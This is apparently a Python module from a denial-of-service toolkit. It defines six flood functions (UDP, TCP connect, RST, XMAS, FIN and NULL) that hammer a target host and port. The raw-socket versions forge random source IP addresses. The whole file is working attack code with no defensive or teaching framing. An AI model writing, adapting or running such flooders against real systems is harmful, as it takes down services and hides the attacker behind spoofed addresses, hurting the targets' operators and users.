import socket
import random
import struct
from utils.helpers import checksum

def udp_flood(target, port, stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop_event.is_set():
        payload = random._urandom(random.randint(512, 1400))
        try:
            sock.sendto(payload, (target, port))
        except:
            pass

def tcp_connect_flood(target, port, stop_event):
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target, port))
            s.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
            s.close()
        except:
            pass

def rst_flood(target, port, stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    while not stop_event.is_set():
        src = ".".join(str(random.randint(1,254)) for _ in range(4))
        ip_h = struct.pack('!BBHHHBBH4s4s', (4<<4)+5, 0, 0, random.randint(0,65535), 0, 64, socket.IPPROTO_TCP, 0, socket.inet_aton(src), socket.inet_aton(target))
        tcp_h = struct.pack('!HHLLBBHHH', random.randint(1024,65535), port, random.randint(0,0xffffffff), 0, (5<<4), 4, 0, 0, 0)
        psh = struct.pack('!4s4sBBH', socket.inet_aton(src), socket.inet_aton(target), 0, socket.IPPROTO_TCP, len(tcp_h)) + tcp_h
        cksum = checksum(psh)
        tcp_h = struct.pack('!HHLLBBHHH', random.randint(1024,65535), port, random.randint(0,0xffffffff), 0, (5<<4), 4, 0, cksum, 0)
        sock.sendto(ip_h+tcp_h, (target,0))

def xmas_flood(target, port, stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    while not stop_event.is_set():
        src = ".".join(str(random.randint(1,254)) for _ in range(4))
        ip_h = struct.pack('!BBHHHBBH4s4s', (4<<4)+5, 0, 0, random.randint(0,65535), 0, 64, socket.IPPROTO_TCP, 0, socket.inet_aton(src), socket.inet_aton(target))
        tcp_h = struct.pack('!HHLLBBHHH', random.randint(1024,65535), port, random.randint(0,0xffffffff), 0, (5<<4), 41, 0, 0, 0) # FIN+URG+PSH
        psh = struct.pack('!4s4sBBH', socket.inet_aton(src), socket.inet_aton(target), 0, socket.IPPROTO_TCP, len(tcp_h)) + tcp_h
        cksum = checksum(psh)
        tcp_h = struct.pack('!HHLLBBHHH', random.randint(1024,65535), port, random.randint(0,0xffffffff), 0, (5<<4), 41, 0, cksum, 0)
        sock.sendto(ip_h+tcp_h, (target,0))

def fin_flood(target, port, stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    while not stop_event.is_set():
        src = ".".join(str(random.randint(1,254)) for _ in range(4))
        ip_h = struct.pack('!BBHHHBBH4s4s', (4<<4)+5, 0, 0, random.randint(0,65535), 0, 64, socket.IPPROTO_TCP, 0, socket.inet_aton(src), socket.inet_aton(target))
        tcp_h = struct.pack('!HHLLBBHHH', random.randint(1024,65535), port, random.randint(0,0xffffffff), 0, (5<<4), 1, 0, 0, 0)
        psh = struct.pack('!4s4sBBH', socket.inet_aton(src), socket.inet_aton(target), 0, socket.IPPROTO_TCP, len(tcp_h)) + tcp_h
        cksum = checksum(psh)
        tcp_h = struct.pack('!HHLLBBHHH', random.randint(1024,65535), port, random.randint(0,0xffffffff), 0, (5<<4), 1, 0, cksum, 0)
        sock.sendto(ip_h+tcp_h, (target,0))

def null_scan_flood(target, port, stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    while not stop_event.is_set():
        src = ".".join(str(random.randint(1,254)) for _ in range(4))
        ip_h = struct.pack('!BBHHHBBH4s4s', (4<<4)+5, 0, 0, random.randint(0,65535), 0, 64, socket.IPPROTO_TCP, 0, socket.inet_aton(src), socket.inet_aton(target))
        tcp_h = struct.pack('!HHLLBBHHH', random.randint(1024,65535), port, random.randint(0,0xffffffff), 0, (5<<4), 0, 0, 0, 0)
        psh = struct.pack('!4s4sBBH', socket.inet_aton(src), socket.inet_aton(target), 0, socket.IPPROTO_TCP, len(tcp_h)) + tcp_h
        cksum = checksum(psh)
        tcp_h = struct.pack('!HHLLBBHHH', random.randint(1024,65535), port, random.randint(0,0xffffffff), 0, (5<<4), 0, 0, cksum, 0)
        sock.sendto(ip_h+tcp_h, (target,0))